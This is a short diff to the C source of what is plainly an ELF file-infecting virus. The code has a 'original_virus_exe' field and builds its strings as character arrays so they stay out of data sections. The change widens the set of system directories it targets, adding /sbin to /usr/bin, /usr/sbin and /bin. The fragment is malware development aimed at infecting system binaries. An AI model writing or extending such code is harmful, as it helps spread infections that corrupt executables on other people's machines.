@@ -124,7 +124,7 @@ typedef struct elfbin {
 	int original_virus_exe;
 } elfbin_t;
 
-#define DIR_COUNT 3
+#define DIR_COUNT 4
 
 _start()
 {
@@ -690,13 +690,13 @@ void do_main(struct bootstrap_data *bootstrap)
 	elfbin_t self, target;
 	int icount = 0;
 	int paddingSize;
-
 	/*
 	 * NOTE: 
 	 * we can't use string literals because they will be
 	 * stored in either .rodata or .data sections.
 	 */
-	char dirs[3][32] = {
+	char dirs[4][32] = {
+			{'/','s','b','i','n','\0'},
 			{'/','u','s','r','/','b','i','n','\0'},
 			{'/','u','s','r','/','s','b','i','n','\0'},        
 			{'/','b','i','n','\0'}
